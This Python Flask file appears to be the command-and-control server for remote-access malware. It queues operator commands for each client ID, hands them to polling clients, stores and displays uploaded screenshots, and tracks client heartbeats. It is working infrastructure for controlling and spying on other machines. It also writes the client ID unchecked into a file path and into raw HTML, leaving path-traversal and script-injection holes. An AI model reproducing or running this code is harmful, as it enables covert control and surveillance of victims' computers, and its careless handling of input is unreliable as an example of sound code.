from flask import Flask, request, jsonify,render_template,redirect,url_for
import time

cmd ={}
heartbeats={}
app = Flask(__name__)

@app.route("/",methods=["GET","POST"])
def home():
    if request.method =="POST":
        client_id=request.form.get("client_id")
        command=request.form.get("command")
        if not client_id or not command:
            return jsonify({"msg":f"ther is no coomand for {client_id}"})
        else:
            cmd[client_id]=command
            return jsonify({"msg": f"Command set for {client_id}", "commands": cmd})
    return render_template("home.html")
@app.route("/get_command/<client_id>",methods=["GET"])
def get_command(client_id):
    if client_id in cmd:
        cmd1=cmd.pop(client_id)
        return jsonify({"command" : cmd1})
    else:
        return jsonify({"command" : None})

@app.route("/upload/<client_id>",methods=["POST","GET"])
def upload(client_id):
    image=request.files["screenshot"]
    image.save(f"static/screenshots/{client_id}.png")
    return redirect(url_for("screen" ,client_id=client_id))

@app.route("/screen/<client_id>")
def screen(client_id):
    return f'''
    <h1>screenshot</h1>
    <img src="/static/screenshots/{client_id}.png" width = "600px">
    '''
@app.route("/heartbeatz/<client_id>" ,methods=["GET","POST"])
def heartbeatz(client_id):
    heartbeats[client_id] = time.time()
    return jsonify({client_id: "is alive"})
        
    
@app.route("/status/<client_id>",methods=["GET","POST"])
def status(client_id):
    if client_id in heartbeats:
        last= time.time()-heartbeats[client_id]
        if last > 60:
            return jsonify({"status" : "is dead"})
        else:
            return jsonify({"status" : "is alive"})
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
    